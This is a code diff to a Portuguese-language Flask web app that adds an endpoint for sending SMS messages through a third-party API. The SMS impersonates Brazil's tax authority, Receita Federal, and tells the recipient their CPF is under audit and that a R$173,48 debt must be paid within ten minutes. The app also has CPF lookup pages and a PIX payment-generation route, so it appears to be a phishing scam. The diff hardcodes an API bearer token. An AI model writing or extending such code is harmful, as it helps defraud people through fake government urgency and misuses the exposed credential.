@@ -5,6 +5,7 @@ import re
 import random
 import string
 import logging
+import json
 
 app = Flask(__name__)
 
@@ -118,6 +119,77 @@ def verificar_cpf():
 def buscar_cpf():
     app.logger.info("[PROD] Acessando página de busca de CPF: buscar-cpf.html")
     return render_template('buscar-cpf.html')
+
+@app.route('/send-sms', methods=['POST'])
+def send_sms():
+    """Enviar SMS de notificação"""
+    try:
+        data = request.get_json()
+        phone = data.get('phone')
+        customer_name = data.get('customer_name', 'Cliente')
+        
+        if not phone:
+            return jsonify({'success': False, 'error': 'Telefone não fornecido'}), 400
+        
+        app.logger.info(f"[PROD] Enviando SMS para: {phone}")
+        
+        # Formatear telefone para padrão internacional
+        phone_clean = ''.join(filter(str.isdigit, phone))
+        if len(phone_clean) == 11:  # Celular com DDD
+            phone_international = f"55{phone_clean}"
+        elif len(phone_clean) == 10:  # Fixo com DDD
+            phone_international = f"55{phone_clean}"
+        else:
+            phone_international = phone_clean
+        
+        # Determinar operadora (simplificado)
+        ddd = phone_clean[:2] if len(phone_clean) >= 2 else "11"
+        if ddd in ["11", "12", "13", "14", "15", "16", "17", "18", "19"]:
+            operator = "vivo"
+        elif ddd in ["21", "22", "24", "27", "28"]:
+            operator = "claro"
+        else:
+            operator = "tim"
+        
+        # Primeira palavra do nome
+        first_name = customer_name.split()[0] if customer_name else "Cliente"
+        
+        # Payload para API SMS
+        sms_payload = {
+            "operator": operator,
+            "destination_number": phone_international,
+            "message": f"RECEITA INFORMA: {first_name}, seu CPF caiu na malha fina. O prazo para realizar o pagamento do seu debito no valor de R$173,48 expira em 10min.",
+            "tag": "Receita_Federal",
+            "user_reply": False,
+            "webhook_url": ""
+        }
+        
+        # Headers com token
+        headers = {
+            'Content-Type': 'application/json',
+            'Authorization': 'Bearer e1c341095ba7ff95264f10a58bc652687b60390b'
+        }
+        
+        app.logger.info(f"[PROD] Payload SMS: {sms_payload}")
+        
+        # Enviar SMS (endpoint correto da API)
+        response = requests.post(
+            'https://api.apisms.me/v2/sms/send',
+            json=sms_payload,
+            headers=headers,
+            timeout=10
+        )
+        
+        if response.ok:
+            app.logger.info(f"[PROD] SMS enviado com sucesso para {phone}")
+            return jsonify({'success': True, 'message': 'SMS enviado'})
+        else:
+            app.logger.warning(f"[PROD] Falha ao enviar SMS: {response.status_code} - {response.text}")
+            return jsonify({'success': False, 'error': 'Falha no envio do SMS'})
+            
+    except Exception as e:
+        app.logger.error(f"[PROD] Erro ao enviar SMS: {str(e)}")
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/generate-pix', methods=['POST'])
 def generate_pix():
